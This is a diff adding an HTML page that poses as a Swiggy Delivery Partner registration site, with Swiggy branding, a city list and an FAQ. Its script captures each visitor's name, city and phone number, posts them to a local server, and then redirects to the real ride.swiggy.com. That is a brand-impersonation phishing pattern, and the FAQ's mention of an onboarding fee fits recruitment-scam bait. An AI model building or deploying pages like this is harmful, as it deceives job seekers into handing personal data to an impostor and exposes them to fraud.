@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Swiggy Form</title>
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <!-- Navbar -->
+    <nav class="navbar">
+      <div class="nav-items1">Swiggy Delivery Partner</div>
+      <div class="nav-items">
+        <a href="#faq">FAQs</a>
+        <a href="#contact">English</a>
+      </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main>
+      <section class="hero">
+        <img src="en.webp" alt="Main Image" class="hero-img" />
+      </section>
+
+      <section class="form-section">
+        <form id="registrationForm">
+          <div class="form-header">
+            <img src="logo-appbar.webp" alt="Swiggy Logo" class="form-logo" />
+            <h1>Swiggy Delivery Partner</h1>
+          </div>
+          <input
+            type="text"
+            id="name"
+            name="name"
+            placeholder="Name"
+            required
+          />
+          <select id="city" name="city" required>
+            <option value="" disabled selected>Select Your City</option>
+            <!-- Populate these options with the list of cities -->
+            <option value="Delhi">Delhi</option>
+            <option value="Mumbai">Mumbai</option>
+            <option value="Bangalore">Bangalore</option>
+            <option value="Chennai">Chennai</option>
+            <option value="Hyderabad">Hyderabad</option>
+            <option value="Kolkata">Kolkata</option>
+            <option value="Pune">Pune</option>
+            <option value="Ahmedabad">Ahmedabad</option>
+            <option value="Jaipur">Jaipur</option>
+            <option value="Surat">Surat</option>
+            <option value="Lucknow">Lucknow</option>
+            <option value="Kanpur">Kanpur</option>
+            <option value="Nagpur">Nagpur</option>
+            <option value="Indore">Indore</option>
+            <option value="Bhopal">Bhopal</option>
+            <option value="Patna">Patna</option>
+            <option value="Vadodara">Vadodara</option>
+            <option value="Coimbatore">Coimbatore</option>
+            <option value="Kochi">Kochi</option>
+            <option value="Visakhapatnam">Visakhapatnam</option>
+            <option value="Bhubaneswar">Bhubaneswar</option>
+            <option value="Agra">Agra</option>
+            <option value="Varanasi">Varanasi</option>
+            <option value="Srinagar">Srinagar</option>
+            <option value="Jammu">Jammu</option>
+            <option value="Dehradun">Dehradun</option>
+            <option value="Noida">Noida</option>
+            <option value="Gurgaon">Gurgaon</option>
+            <option value="Thane">Thane</option>
+            <option value="Mysore">Mysore</option>
+          </select>
+          <input
+            type="tel"
+            id="phone"
+            name="phone"
+            placeholder="Phone Number"
+            required
+          />
+          <button type="submit">Submit</button>
+        </form>
+      </section>
+
+      <!-- New Box Section -->
+      <section class="steps-section">
+        <div class="steps-box">
+          <h2>Get started in <span class="highlight">3 steps</span></h2>
+          <ol class="steps-list">
+            <li>1) Download Swiggy rider app from app store</li>
+            <li>b) Fill in details and documents</li>
+            <li>c) Collect bag and t-shirt</li>
+          </ol>
+          <button class="get-started-btn">
+            Get Started by filling up the form
+          </button>
+          <img
+            src="data:image/jpeg;base64,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"
+            alt="Get Started Image"
+            class="steps-img"
+          />
+        </div>
+      </section>
+
+      <!-- FAQ Section -->
+      <section id="faq" class="faq-section">
+        <h2>FAQs</h2>
+        <div class="faq-item">
+          <h3>1. How can I become a delivery partner with Swiggy?</h3>
+          <p>
+            You can join Swiggy in 3 easy steps: <br />• Download the app
+            <br />• Complete your profile and upload documents <br />• Get your
+            uniform and bag delivered at your home <br />• Deliver orders and
+            Earn big with Swiggy
+          </p>
+        </div>
+        <div class="faq-item">
+          <h3>2. What documents and details do I need to join Swiggy?</h3>
+          <p>
+            You need the following documents. In case you don’t have any of
+            these documents, don’t worry - you can share them later: <br />•
+            Aadhar Card or Voter Card <br />• PAN Card <br />• Driving licence
+            (not needed for cycle) <br />• Bank details
+          </p>
+        </div>
+        <div class="faq-item">
+          <h3>
+            3. Is there any joining fee to become a delivery partner in Swiggy?
+          </h3>
+          <p>
+            The onboarding fee is around ₹1500 and it varies from city to city.
+            This fee is deducted in multiple installments after your onboarding.
+          </p>
+        </div>
+        <div class="faq-item">
+          <h3>
+            4. What are the working hours for a delivery partner at Swiggy?
+          </h3>
+          <p>
+            Swiggy offers complete flexibility to choose your shifts. You can
+            become a part-time or a full-time delivery partner based on your
+            preference.
+          </p>
+        </div>
+      </section>
+    </main>
+
+    <!-- Footer -->
+    <footer>
+      <div class="footer-content">
+        <div class="footer-section">
+          <h3>Company</h3>
+          <ul>
+            <li><a href="#">About Us</a></li>
+            <li><a href="#">Team</a></li>
+            <li><a href="#">Blog</a></li>
+          </ul>
+        </div>
+        <div class="footer-section">
+          <h3>Contact</h3>
+          <ul>
+            <li><a href="https://www.facebook.com">Facebook</a></li>
+            <li><a href="https://wa.me/">WhatsApp</a></li>
+          </ul>
+        </div>
+      </div>
+    </footer>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        // Add event listener for form submission
+        document
+          .getElementById("registrationForm")
+          .addEventListener("submit", function (event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Get form data
+            const name = document.getElementById("name").value;
+            const city = document.getElementById("city").value;
+            const phone = document.getElementById("phone").value;
+
+            // Send form data to server
+            fetch("http://localhost:3000/submit", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({ name, city, phone }),
+            })
+              .then((response) => response.text())
+              .then((data) => {
+                 // Show server response
+                // Redirect to google.com after 2 seconds
+                setTimeout(() => {
+                  window.location.href = "https://ride.swiggy.com/";
+                }, 500); // 2000 milliseconds = 2 seconds
+              })
+              .catch((error) => {
+                console.error("Error:", error);
+              });
+          });
+      });
+    </script>
+  </body>
+</html>
